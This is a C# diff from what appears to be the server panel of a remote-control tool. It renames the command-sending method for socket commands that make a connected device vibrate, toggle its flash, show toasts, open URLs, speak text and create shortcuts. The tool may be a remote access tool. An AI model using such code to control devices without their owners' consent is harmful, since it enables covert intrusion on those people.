@@ -22,7 +22,7 @@ namespace Server.Views
             try
             {
 
-                MainWindow.KomutGonder("VIBRATION", "[VERI]" + ((int)numericUpDown1.Value * 1000).ToString() + "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("VIBRATION", "[VERI]" + ((int)numericUpDown1.Value * 1000).ToString() + "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -31,7 +31,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("FLASH", "[VERI]AC[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("FLASH", "[VERI]AC[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -40,7 +40,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("FLASH", "[VERI]KAPA[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("FLASH", "[VERI]KAPA[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -49,7 +49,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("TOST", "[VERI]" + textBox1.Text + "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("TOST", "[VERI]" + textBox1.Text + "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -58,7 +58,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("URL", "[VERI]" + textBox2.Text + "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("URL", "[VERI]" + textBox2.Text + "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -67,7 +67,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("ANASAYFA", "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("ANASAYFA", "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -76,7 +76,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("KONUS", "[VERI]" + textBox3.Text + "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("KONUS", "[VERI]" + textBox3.Text + "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -111,7 +111,7 @@ namespace Server.Views
         {
             if (pictureBox1.Image != null)
             {
-                MainWindow.KomutGonder("SHORTCUT", "[VERI]" + textBox4.Text + "[VERI]" + textBox5.Text + "[VERI]" + Convert.ToBase64String(ico_bytes) + "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("SHORTCUT", "[VERI]" + textBox4.Text + "[VERI]" + textBox5.Text + "[VERI]" + Convert.ToBase64String(ico_bytes) + "[VERI][0x09]", sck);
             }
         }
         public static Bitmap ResizeImage(Image image, int width, int height)
